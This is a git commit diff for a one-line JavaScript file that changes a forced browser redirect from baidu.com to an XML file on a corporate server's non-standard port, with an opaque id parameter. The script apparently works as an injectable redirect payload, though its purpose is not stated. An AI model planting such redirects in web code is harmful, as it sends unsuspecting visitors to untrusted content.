ecd0cdda062a7ca993cb25390c61243d2250afe8
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-11-23 20:27:51 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-window.location.href='http://www.baidu.com'
+window.location.href='https://glzx.yonghui.cn:8886/image/newvss/cooperation/20231102/3d16f87fc9d94caaad1d450558812b21/1663597464.xml?id=0gXs8WhnPODycredEG9ax4L1wMCVNb6j'
